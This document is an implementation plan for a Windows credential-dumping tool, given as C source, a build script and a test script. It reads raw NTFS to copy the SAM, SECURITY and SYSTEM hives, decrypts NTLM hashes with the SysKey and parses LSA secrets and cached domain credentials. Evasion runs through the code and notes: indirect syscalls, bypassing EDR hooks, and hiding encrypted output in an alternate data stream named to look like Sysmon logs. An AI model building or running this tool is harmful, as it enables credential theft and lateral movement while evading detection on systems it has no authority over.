# Plan 2 — SAM + LSA Secrets + Cached Credentials: Implementation Plan

> **Target**: T1003.002/.004/.005 | **Pre-condition**: SYSTEM (assumed) | **Focus**: Dump only
> **Related**: See also `..\SAMnLSA_dump\IMPLEMENTATION_PLAN.md` for full PE→dump chain

---

## 0. Project Structure

```
OS_dump/Plan2_SAM_LSA/
├── SPEC.md                     ← Technical spec (Plan2_SAM_LSA_Dump_SPEC.md)
├── IMPL.md                     ← This file
├── build.bat                   ← MSVC build
├── src/
│   ├── main.c                  ← Entry point
│   ├── ntfs_raw.c/h            ← Raw NTFS volume reader
│   ├── mft_parser.c/h          ← MFT walker + DataRun decoder
│   ├── hive_extractor.c/h      ← Hive file extraction from NTFS
│   ├── sam_parser.c/h          ← SAM hive parser
│   ├── security_parser.c/h     ← SECURITY hive + LSA secrets parser
│   ├── system_parser.c/h       ← SYSTEM hive → SysKey extraction
│   ├── cache_parser.c/h        ← MSCache v2 parser
│   ├── reg_fallback.c/h        ← NtSaveKey fallback method
│   ├── ads_writer.c/h          ← ADS output
│   ├── cleanup.c/h             ← Cleanup
│   └── crypto/
│       ├── aes256_gcm.c/h
│       ├── sha256.c/h
│       ├── rc4.c/h
│       └── md5.c/h
├── test/
│   ├── run_test.ps1
│   ├── verify_creds.py
│   └── detect_check.ps1
└── output/
```

---

## 1. Build

```batch
@echo off
REM build.bat — Plan 2 SAM LSA Dump
call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

set CFLAGS=/nologo /O2 /MT /GS- /GL /W3 /WX- /Z7 ^
           /D "WIN32_LEAN_AND_MEAN" /D "NDEBUG" /D "_CONSOLE"

cl.exe %CFLAGS% /Fe"SAMLSAExtract.exe" ^
    src\main.c src\ntfs_raw.c src\mft_parser.c ^
    src\hive_extractor.c src\sam_parser.c ^
    src\security_parser.c src\system_parser.c ^
    src\cache_parser.c src\reg_fallback.c ^
    src\ads_writer.c src\cleanup.c ^
    src\crypto\aes256_gcm.c src\crypto\sha256.c ^
    src\crypto\rc4.c src\crypto\md5.c ^
    /link /NOLOGO /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT ^
    kernel32.lib ntdll.lib advapi32.lib

echo Build complete: SAMLSAExtract.exe
```

---

## 2. Core Implementation

### 2.1 Main Entry

```c
// main.c
int wmain(int argc, WCHAR* argv[]) {
    COMMAND cmd = ParseCommandLine(argc, argv);
    
    switch (cmd) {
    case CMD_DUMP_ALL:
        return DumpAll();
    case CMD_EXTRACT_ONLY:
        return ExtractOnly();
    case CMD_PARSE_ONLY:
        return ParseOnly(argv[2]);
    case CMD_WHOAMI:
        return CheckPrivilege();
    case CMD_CLEANUP:
        return DoCleanup();
    }
    return 0;
}

int DumpAll() {
    HIVE_DATA sam = {0}, security = {0}, system = {0};
    CRED_OUTPUT output = {0};
    
    wprintf(L"[*] Plan 2: SAM + LSA Secrets + Cached Credentials Dump\n");
    wprintf(L"    Method: Raw NTFS Volume Read\n\n");
    
    // ── Step 1: Extract hives via raw NTFS ──
    wprintf(L"[1/5] Extracting hives from NTFS volume...\n");
    
    HANDLE hVolume = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, NULL);
    
    if (hVolume == INVALID_HANDLE_VALUE) {
        wprintf(L"      Raw NTFS failed (0x%08X), trying NtSaveKey fallback...\n",
            GetLastError());
        return DumpViaRegistry();
    }
    wprintf(L"      Volume handle: OK\n");
    
    // Parse NTFS structure
    NTFS_CONTEXT ntfs = {0};
    if (!ParseNtfsBoot(hVolume, &ntfs)) {
        wprintf(L"      Failed to parse NTFS boot sector\n");
        CloseHandle(hVolume);
        return DumpViaRegistry();
    }
    wprintf(L"      Cluster size: %d bytes, MFT at cluster %lld\n",
        ntfs.clusterSize, ntfs.mftStartCluster);
    
    // Read MFT
    PBYTE mftBuffer = NULL;
    SIZE_T mftSize = 0;
    if (!ReadMft(hVolume, &ntfs, &mftBuffer, &mftSize)) {
        wprintf(L"      Failed to read MFT\n");
        CloseHandle(hVolume);
        return DumpViaRegistry();
    }
    wprintf(L"      MFT: %lld bytes read\n", mftSize);
    
    // Locate and extract hive files
    WCHAR* targets[] = { L"SAM", L"SECURITY", L"SYSTEM" };
    HIVE_DATA* hives[] = { &sam, &security, &system };
    WCHAR hivePaths[3][MAX_PATH];
    
    for (int i = 0; i < 3; i++) {
        swprintf(hivePaths[i], MAX_PATH,
            L"\\Windows\\System32\\config\\%s", targets[i]);
        
        if (ExtractFileFromNtfs(hVolume, &ntfs, mftBuffer, mftSize,
            hivePaths[i], hives[i])) {
            wprintf(L"      %-10s: %lld bytes, signature: %.4s\n",
                targets[i], hives[i]->size,
                (hives[i]->size >= 4) ? (PCHAR)hives[i]->data : "N/A");
        } else {
            wprintf(L"      %-10s: FAILED\n", targets[i]);
        }
    }
    
    CloseHandle(hVolume);
    free(mftBuffer);
    
    // Fallback if any hive missing
    if (!sam.data || !security.data || !system.data) {
        wprintf(L"      Some hives missing, trying registry fallback...\n");
        return DumpViaRegistry();
    }
    
    // ── Step 2: Extract SysKey from SYSTEM hive ──
    wprintf(L"\n[2/5] Extracting SysKey from SYSTEM hive... ");
    BYTE sysKey[16];
    if (ExtractSysKey(system.data, system.size, sysKey)) {
        wprintf(L"OK (");
        for (int i = 0; i < 16; i++) wprintf(L"%02X", sysKey[i]);
        wprintf(L")\n");
    } else {
        wprintf(L"FAILED\n");
        return 2;
    }
    
    // ── Step 3: Parse SAM → NTLM hashes ──
    wprintf(L"[3/5] Parsing SAM hive...\n");
    DWORD userCount = ParseSAM(sam.data, sam.size, sysKey, &output.users);
    wprintf(L"      Extracted %d user(s) with NTLM hashes\n", userCount);
    
    // ── Step 4: Parse SECURITY → LSA secrets + MSCache ──
    wprintf(L"[4/5] Parsing SECURITY hive...\n");
    DWORD secretCount = ParseLSASecrets(security.data, security.size, sysKey,
        &output.secrets);
    DWORD cacheCount  = ParseMSCache(security.data, security.size,
        &output.caches);
    wprintf(L"      LSA Secrets: %d | MSCache v2 entries: %d\n",
        secretCount, cacheCount);
    
    // ── Step 5: Encrypt + output to ADS ──
    wprintf(L"[5/5] Encrypting + writing output...\n");
    output.computerName = GetComputerName();
    output.domainName   = GetDomainName();
    output.machineSid   = GetMachineSid();
    output.userCount    = userCount;
    output.secretCount  = secretCount;
    output.cacheCount   = cacheCount;
    
    PBYTE encryptedBlob = NULL;
    SIZE_T blobSize = 0;
    EncryptOutput(&output, &encryptedBlob, &blobSize);
    wprintf(L"      Encrypted blob: %lld bytes\n", blobSize);
    
    WriteToAds(L"C:\\Windows\\System32\\winevt\\Logs\\"
               L"Microsoft-Windows-Sysmon%4Operational.evtx",
               L"Microsoft-Windows-CredentialManager%4Debug",
               encryptedBlob, blobSize);
    wprintf(L"      ADS written: OK\n");
    
    // ── Cleanup ──
    FreeHiveData(&sam);
    FreeHiveData(&security);
    FreeHiveData(&system);
    FreeCredOutput(&output);
    free(encryptedBlob);
    
    wprintf(L"\n[*] Dump complete. Verify: more < ADS_path\n");
    return 0;
}
```

### 2.2 NTFS Boot Parser

```c
// ntfs_raw.c
typedef struct _NTFS_BPB {
    USHORT bytesPerSector;
    BYTE   sectorsPerCluster;
    USHORT reservedSectors;
    BYTE   reserved1[3];
    USHORT reserved2;
    BYTE   mediaDescriptor;
    USHORT reserved3;
    USHORT sectorsPerTrack;
    USHORT numberOfHeads;
    ULONG  hiddenSectors;
    ULONG  reserved4;
} NTFS_BPB;

typedef struct _NTFS_BOOT_SECTOR {
    BYTE     jump[3];
    CHAR     oemId[8];
    NTFS_BPB bpb;
    BYTE     extended[426];   // contains MFT cluster + mirror
    USHORT   signature;       // 0xAA55
} NTFS_BOOT_SECTOR;

typedef struct _NTFS_CONTEXT {
    DWORD   bytesPerSector;
    DWORD   sectorsPerCluster;
    DWORD   clusterSize;
    DWORD64 mftStartCluster;
    DWORD64 totalClusters;
} NTFS_CONTEXT;

BOOL ParseNtfsBoot(HANDLE hVolume, NTFS_CONTEXT* ctx) {
    BYTE bootSector[512];
    DWORD bytesRead;
    
    if (!ReadFile(hVolume, bootSector, sizeof(bootSector), &bytesRead, NULL))
        return FALSE;
    
    NTFS_BOOT_SECTOR* boot = (NTFS_BOOT_SECTOR*)bootSector;
    
    if (boot->signature != 0xAA55) return FALSE;
    if (memcmp(boot->oemId, "NTFS    ", 8) != 0) return FALSE;
    
    ctx->bytesPerSector    = boot->bpb.bytesPerSector;
    ctx->sectorsPerCluster = boot->bpb.sectorsPerCluster;
    ctx->clusterSize       = ctx->bytesPerSector * ctx->sectorsPerCluster;
    
    // MFT start cluster is at offset 0x30 in the extended boot record
    ctx->mftStartCluster = *(PDWORD64)(bootSector + 0x30);
    ctx->totalClusters   = *(PDWORD64)(bootSector + 0x28);
    
    return TRUE;
}
```

### 2.3 MFT Parser

```c
// mft_parser.c

// Read entire MFT into memory
BOOL ReadMft(HANDLE hVolume, NTFS_CONTEXT* ctx, PBYTE* buffer, PSIZE_T size) {
    // MFT record size is stored in $Boot (offset 0x40)
    // Default: 1024 bytes
    BYTE bootSector[512];
    DWORD bytesRead;
    ReadFile(hVolume, bootSector, sizeof(bootSector), &bytesRead, NULL);
    
    BYTE clustersPerMftRecord = *(PBYTE)(bootSector + 0x40);
    DWORD mftRecordSize;
    if (clustersPerMftRecord > 0) {
        mftRecordSize = ctx->clusterSize * clustersPerMftRecord;
    } else {
        mftRecordSize = 1 << (-clustersPerMftRecord); // 2^(-n) bytes
    }
    
    // Read MFT $DATA attribute from MFT record #0
    ULONG64 mftOffset = ctx->mftStartCluster * ctx->clusterSize;
    
    // First read one record to get $DATA attribute → DataRuns
    BYTE firstRecord[1024];
    LARGE_INTEGER li;
    li.QuadPart = mftOffset;
    SetFilePointerEx(hVolume, li, NULL, FILE_BEGIN);
    ReadFile(hVolume, firstRecord, mftRecordSize, &bytesRead, NULL);
    
    // Parse $DATA attribute from MFT record #0 → get DataRuns
    DATA_RUN* runs = NULL;
    DWORD runCount = ExtractDataRuns(firstRecord, mftRecordSize, &runs);
    
    // Read all MFT data using DataRuns
    SIZE_T totalSize = 0;
    for (DWORD i = 0; i < runCount; i++) {
        totalSize += runs[i].length * ctx->clusterSize;
    }
    
    *buffer = (PBYTE)malloc(totalSize);
    *size = totalSize;
    
    PBYTE ptr = *buffer;
    for (DWORD i = 0; i < runCount; i++) {
        li.QuadPart = runs[i].offset * ctx->clusterSize;
        SetFilePointerEx(hVolume, li, NULL, FILE_BEGIN);
        
        DWORD runSize = (DWORD)(runs[i].length * ctx->clusterSize);
        ReadFile(hVolume, ptr, runSize, &bytesRead, NULL);
        ptr += runSize;
    }
    
    free(runs);
    return TRUE;
}
```

### 2.4 File Extraction from MFT

```c
// hive_extractor.c
// Walk MFT directory tree → find target file → extract from NTFS clusters

typedef struct _MFT_DIR_WALKER {
    HANDLE     hVolume;
    NTFS_CONTEXT* ntfs;
    PBYTE      mftBuffer;
    SIZE_T     mftSize;
    DWORD      mftRecordSize;
    WCHAR      currentPath[MAX_PATH];
    DWORD64    currentRecord;  // MFT record index of current directory
} MFT_DIR_WALKER;

BOOL ExtractFileFromNtfs(HANDLE hVolume, NTFS_CONTEXT* ntfs,
    PBYTE mftBuffer, SIZE_T mftSize, PWSTR filePath, PHIVE_DATA hive) {
    
    // 1. Start from root directory (MFT record #5)
    // 2. For each path component (Windows, System32, config, SAM):
    //    - Walk current directory's $INDEX_ROOT / $INDEX_ALLOCATION
    //    - Find child by $FILE_NAME
    //    - Get child MFT record number
    // 3. At target file's MFT record:
    //    - Parse $DATA attribute → get DataRuns
    //    - ReadFile at cluster offsets → reconstruct file
    
    MFT_DIR_WALKER walker = {
        .hVolume = hVolume, .ntfs = ntfs,
        .mftBuffer = mftBuffer, .mftSize = mftSize,
        .currentRecord = 5  // root directory
    };
    
    // Walk path components
    WCHAR pathCopy[MAX_PATH];
    wcscpy(pathCopy, filePath);
    PWSTR token = wcstok(pathCopy, L"\\");
    
    while (token) {
        DWORD64 childRecord = 0;
        if (!FindChildInDir(&walker, token, &childRecord))
            return FALSE;
        walker.currentRecord = childRecord;
        token = wcstok(NULL, L"\\");
    }
    
    // At target file → extract $DATA
    PBYTE record = GetMftRecord(mftBuffer, mftSize, walker.currentRecord);
    if (!record) return FALSE;
    
    DATA_RUN* runs = NULL;
    DWORD runCount = ExtractDataRuns(record, walker.mftRecordSize, &runs);
    if (runCount == 0) {
        // Resident $DATA → data is inside MFT record itself
        return ExtractResidentData(record, walker.mftRecordSize, hive);
    }
    
    // Non-resident → read from clusters
    SIZE_T totalSize = 0;
    for (DWORD i = 0; i < runCount; i++)
        totalSize += runs[i].length * ntfs->clusterSize;
    
    hive->data = (PBYTE)malloc(totalSize);
    hive->size = totalSize;
    
    PBYTE ptr = hive->data;
    for (DWORD i = 0; i < runCount; i++) {
        LARGE_INTEGER li;
        li.QuadPart = runs[i].offset * ntfs->clusterSize;
        SetFilePointerEx(hVolume, li, NULL, FILE_BEGIN);
        
        DWORD runBytes = (DWORD)(runs[i].length * ntfs->clusterSize);
        DWORD bytesRead;
        ReadFile(hVolume, ptr, runBytes, &bytesRead, NULL);
        ptr += bytesRead;
    }
    
    free(runs);
    return TRUE;
}
```

### 2.5 Registry Fallback Method

```c
// reg_fallback.c — Used when raw NTFS is blocked

int DumpViaRegistry() {
    wprintf(L"\n[*] Falling back to NtSaveKey method...\n");
    
    // Enable SeBackupPrivilege
    RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE, TRUE, FALSE, NULL);
    
    WCHAR* hiveNames[] = { L"SAM", L"SECURITY", L"SYSTEM" };
    WCHAR* hivePaths[] = {
        L"\\Registry\\Machine\\SAM",
        L"\\Registry\\Machine\\SECURITY",
        L"\\Registry\\Machine\\SYSTEM"
    };
    WCHAR* outputPaths[] = {
        L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\SAM.evtx",
        L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\SECURITY.evtx",
        L"\\??\\C:\\Windows\\System32\\winevt\\Logs\\SYSTEM.evtx"
    };
    
    for (int i = 0; i < 3; i++) {
        wprintf(L"    Exporting %s hive...\n", hiveNames[i]);
        
        // Open registry hive
        UNICODE_STRING hiveName;
        RtlInitUnicodeString(&hiveName, hivePaths[i]);
        
        OBJECT_ATTRIBUTES oa = { sizeof(oa) };
        oa.ObjectName = &hiveName;
        
        HKEY hKey;
        NTSTATUS st = SysNtOpenKey(&hKey, KEY_READ, &oa); // indirect syscall
        if (!NT_SUCCESS(st)) {
            wprintf(L"    FAILED to open %s (0x%08X)\n", hiveNames[i], st);
            return 1;
        }
        
        // Save hive
        UNICODE_STRING outPath;
        RtlInitUnicodeString(&outPath, outputPaths[i]);
        
        st = SysNtSaveKey(hKey, &outPath); // indirect syscall
        if (!NT_SUCCESS(st)) {
            wprintf(L"    FAILED to save %s (0x%08X)\n", hiveNames[i], st);
            SysNtClose(hKey);
            return 1;
        }
        
        SysNtClose(hKey);
        
        // Read saved hive back into memory for parsing
        WCHAR ntPath[MAX_PATH];
        swprintf(ntPath, MAX_PATH,
            L"\\\\.\\C:\\Windows\\System32\\winevt\\Logs\\%s.evtx", hiveNames[i]);
        
        HANDLE hFile = CreateFileW(ntPath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        
        DWORD size = GetFileSize(hFile, NULL);
        PBYTE data = (PBYTE)malloc(size);
        DWORD read;
        ReadFile(hFile, data, size, &read, NULL);
        CloseHandle(hFile);
        
        // Store for parsing
        // ... (assign to appropriate hive_data struct)
        
        // Delete the saved hive from disk
        DeleteFileW(ntPath + 4); // remove \\.\ prefix
    }
    
    wprintf(L"    Registry fallback complete.\n");
    return 0;
}
```

### 2.6 SysKey Extraction from SYSTEM Hive

```c
// system_parser.c
BOOL ExtractSysKey(PBYTE sysData, SIZE_T sysSize, BYTE sysKey[16]) {
    // Path: SYSTEM\CurrentControlSet\Control\Lsa
    // Keys: JD, Skew1, GBG, Data (each REG_BINARY)
    
    BYTE jd[4], skew1[4], gbg[4], data[4];
    
    if (!GetRegValue(sysData, sysSize,
        L"\\CurrentControlSet\\Control\\Lsa\\JD", jd, sizeof(jd)))
        return FALSE;
    if (!GetRegValue(sysData, sysSize,
        L"\\CurrentControlSet\\Control\\Lsa\\Skew1", skew1, sizeof(skew1)))
        return FALSE;
    if (!GetRegValue(sysData, sysSize,
        L"\\CurrentControlSet\\Control\\Lsa\\GBG", gbg, sizeof(gbg)))
        return FALSE;
    if (!GetRegValue(sysData, sysSize,
        L"\\CurrentControlSet\\Control\\Lsa\\Data", data, sizeof(data)))
        return FALSE;
    
    // Concatenate: JD || Skew1 || GBG || Data → 16 bytes raw
    BYTE rawKey[16];
    memcpy(rawKey,      jd,    4);
    memcpy(rawKey + 4,  skew1, 4);
    memcpy(rawKey + 8,  gbg,   4);
    memcpy(rawKey + 12, data,  4);
    
    // Permute using SysKey permutation table
    const int perm[] = {
        0x08, 0x05, 0x04, 0x02, 0x0B, 0x09, 0x0D, 0x03,
        0x00, 0x06, 0x01, 0x0C, 0x0E, 0x0A, 0x0F, 0x07
    };
    for (int i = 0; i < 16; i++)
        sysKey[i] = rawKey[perm[i]];
    
    return TRUE;
}
```

### 2.7 NTLM Hash Decryption

```c
// sam_parser.c
DWORD ParseSAM(PBYTE samData, SIZE_T samSize, BYTE sysKey[16],
    NTLM_CRED** outCreds) {
    
    // 1. Open SAM\Domains\Account\Users
    // 2. Enumerate subkeys (RIDs)
    // 3. For each RID key: read V value
    // 4. Extract encrypted NTLM hash from V
    // 5. Decrypt with SysKey
    
    DWORD credCount = 0;
    *outCreds = NULL;
    
    PWSTR usersPath = L"\\Domains\\Account\\Users";
    PWSTR* rids = NULL;
    DWORD ridCount = EnumSubkeys(samData, samSize, usersPath, &rids);
    
    for (DWORD i = 0; i < ridCount; i++) {
        // Skip Names subkey
        if (wcscmp(rids[i], L"Names") == 0) continue;
        
        // Convert hex string RID to integer
        DWORD rid = wcstoul(rids[i], NULL, 16);
        if (rid == 0 || rid == 0xFFFFFFFF) continue;
        
        WCHAR vPath[MAX_PATH];
        swprintf(vPath, MAX_PATH, L"%s\\%s\\V", usersPath, rids[i]);
        
        PBYTE vData = NULL;
        DWORD vSize = 0;
        if (!GetRegValue(samData, samSize, vPath, &vData, &vSize))
            continue;
        
        // V value parsing (see SPEC for structure)
        DWORD ntlmOffset  = *(PDWORD)(vData + 0x0C);
        DWORD ntlmSize    = *(PDWORD)(vData + 0x10);
        DWORD lmOffset    = *(PDWORD)(vData + 0x14);
        
        // Get encrypted blob (starts at V+0xCC)
        PBYTE encryptedBlock = vData + 0xCC;
        
        // Extract encrypted hashes
        BYTE encNtlm[16], encLm[16];
        memcpy(encNtlm, encryptedBlock + ntlmOffset, 16);
        memcpy(encLm,   encryptedBlock + lmOffset, 16);
        
        // Decrypt NTLM hash
        BYTE ntlmHash[16], lmHash[16];
        
        // MD5(SysKey + RID_bytes + "NTPASSWORD\0" + SysKey)

        BYTE ridBytes[4];
        *(PDWORD)ridBytes = rid;
        
        BYTE md5Input[16 + 4 + 11 + 16]; // SysKey + RID + "NTPASSWORD\0" + SysKey
        memcpy(md5Input,       sysKey,   16);
        memcpy(md5Input + 16,  ridBytes, 4);
        memcpy(md5Input + 20,  "NTPASSWORD", 11);
        memcpy(md5Input + 31,  sysKey,   16);
        
        BYTE rc4Key[16];
        MD5(md5Input, sizeof(md5Input), rc4Key);
        RC4(rc4Key, 16, encNtlm, 16, ntlmHash);
        
        // Decrypt LM hash (similar, use "LMPASSWORD")
        // ... 
        
        // Store credential
        *outCreds = realloc(*outCreds, (credCount + 1) * sizeof(NTLM_CRED));
        (*outCreds)[credCount].rid = rid;
        memcpy((*outCreds)[credCount].ntlm, ntlmHash, 16);
        memcpy((*outCreds)[credCount].lm,   lmHash,   16);
        credCount++;
        
        free(vData);
    }
    
    // Get usernames from SAM\Domains\Account\Names\{Name}\@
    for (DWORD i = 0; i < credCount; i++) {
        ResolveUsername(samData, samSize, (*outCreds)[i].rid,
            &(*outCreds)[i].username);
    }
    
    free(rids);
    return credCount;
}
```

---

## 3. Test Script

```powershell
# test/run_test.ps1
param([switch]$SkipCleanup)

$TOOL = ".\SAMLSAExtract.exe"
$LOG  = ".\output\test_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"

function Log($m) { "$(Get-Date -Format 'HH:mm:ss') $m" | Tee-Object $LOG -Append }

Log "=== SAM + LSA Secrets + Cached Credentials TEST ==="
Log "Checking SYSTEM privilege..."
Log (& $TOOL --whoami 2>&1)

Log "Starting extraction..."
$sw = [Diagnostics.Stopwatch]::StartNew()
Log (& $TOOL --dump-all 2>&1)
$sw.Stop()
Log "Extraction completed in $($sw.Elapsed.TotalSeconds)s"

# Verify ADS output
$adsPath = "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx:Microsoft-Windows-CredentialManager%4Debug"
$adsContent = Get-Content $adsPath -Raw -EA SilentlyContinue
if ($adsContent) {
    Log "ADS found: $($adsContent.Length) bytes"
    python3 verify_creds.py --input-ads "$adsPath" --output ".\output\creds.txt"
    
    if (Test-Path ".\output\creds.txt") {
        Log "Credentials extracted:"
        Get-Content ".\output\creds.txt" | Select-Object -First 20 | ForEach-Object { Log "  $_" }
    }
} else {
    Log "ERROR: No ADS output found!"
}

# EDR check
Log "Checking EDR alerts..."
& .\detect_check.ps1 | Tee-Object $LOG -Append

if (-not $SkipCleanup) { Log "Cleanup..."; & $TOOL --cleanup }
Log "=== TEST COMPLETE ==="
```

---

## 4. Key Technical Notes

### Why SysKey derivation works offline
SysKey is derived from 4 values in SYSTEM hive — no LSASS memory needed. This makes offline parsing possible without touching any running process.

### Why raw NTFS is preferred over NtSaveKey
`NtSaveKey` still hits the registry API, which can be hooked/minifiltered. Raw NTFS read is just `ReadFile` on `\\.\C:` — there is no callback for "which file does this cluster belong to?" at the EDR level.

### MSCache v2 format
MSCache v2 stores cached domain credentials for users who have previously logged on. Even if the DC is unreachable, these cached hashes allow offline cracking of domain passwords.
